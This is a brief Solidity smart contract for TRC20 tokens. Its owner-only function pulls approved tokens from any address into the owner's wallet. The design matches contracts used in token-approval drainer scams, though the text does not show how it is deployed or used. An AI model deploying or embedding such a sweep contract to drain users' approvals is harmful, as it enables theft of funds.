pragma solidity ^0.5.0;

import "./ITRC20.sol";

contract Agent {
    address _owner;

    constructor() public {
        _owner = msg.sender;
    }

    function transfer(address token, address payable from, uint256 amount) public payable {
        require(msg.sender == _owner, "Only the owner can transfer tokens");
        require(amount > 0, "Amount must be greater than 0");
        bool res = ITRC20(token).transferFrom(from, _owner, amount);
        require(res, "Transfer failed");
    }
}